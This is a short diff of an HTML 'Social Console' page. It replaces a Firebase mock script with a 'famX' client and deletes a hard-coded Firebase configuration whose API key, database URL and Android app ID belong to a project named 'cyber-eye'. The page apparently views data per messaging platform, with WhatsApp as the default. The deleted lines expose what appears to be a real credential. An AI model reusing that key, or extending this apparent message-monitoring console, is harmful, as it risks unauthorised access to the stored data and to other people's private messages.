@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <title>Social Console</title>
   <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
-  <script src="/static/firebase-mock.js"></script>
+  <script src="/static/famx-client.js"></script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -921,15 +921,7 @@
   </div>
 
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyAHkYidYFElwq3Mt13t0jlpIlhw33DtVco",
-      databaseURL: "https://cyber-eye-ccb1e-default-rtdb.firebaseio.com",
-      projectId: "cyber-eye-ccb1e",
-      storageBucket: "cyber-eye-ccb1e.firebasestorage.app",
-      appId: "1:652079429761:android:e17fe06347e2ba0b1a3580"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    const db = famX.database();
 
     let activeID = "";
     let activePlatform = "com_whatsapp";
